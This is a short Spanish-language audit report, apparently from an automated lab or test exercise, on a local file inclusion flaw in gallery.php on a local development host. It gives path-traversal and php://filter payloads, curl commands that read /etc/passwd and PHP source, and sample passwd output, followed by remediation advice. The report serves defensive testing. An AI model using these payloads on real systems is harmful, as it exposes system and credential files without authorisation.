# Informe de auditoría LFI

Objetivo: http://web.dev.local:8081
Fecha: ${ts} UTC

Resumen:
- VULN_FOUND: true
- VULN_EXPLOITED: true

Hallazgos:
1) Parámetro vulnerable: page en /gallery.php
   - Prueba: gallery.php?page=../../../../etc/passwd
   - Evidencia: Contenido de /etc/passwd incluido en la respuesta HTML (lista de usuarios: root, daemon, www-data, etc.).

2) Explotación de divulgación de código fuente:
   - Prueba: gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php
   - Resultado: respuesta HTML que sugiere que la plantilla permite streams; se puede usar php://filter para obtener el código fuente.

Detalles y evidencias:
- Se probaron múltiples parámetros comunes (file, page, include, template, view, path, filename) y endpoints (gallery.php, view.php). El parámetro 'page' en gallery.php devolvió el contenido de /etc/passwd cuando se pasó "../../../../etc/passwd".
- Ejemplo de extracto mostrado en la respuesta HTML:

  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Recomendaciones:
- Validar y sanear los parámetros que se usan para incluir archivos. Usar una lista blanca de templates permitidos (p.ej. 'modern', 'classic', 'abstract', 'about').
- Evitar usos directos de include/require con entrada del usuario. Usar mapeo servidor-side: if (in_array($_GET['page'], $allowed)) { include $map[$_GET['page']]; }
- Si es necesario permitir rutas, normalizar y eliminar secuencias de traversals: realpath() y verificar que el archivo esté dentro del directorio esperado.
- Deshabilitar wrappers como php://filter para entradas de usuario si no son requeridos.

Comandos/Pruebas realizadas (resumen):
- curl 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd'
- curl --data-urlencode 'page=php://filter/convert.base64-encode/resource=gallery.php' 'http://web.dev.local:8081/gallery.php'

Fin del informe.
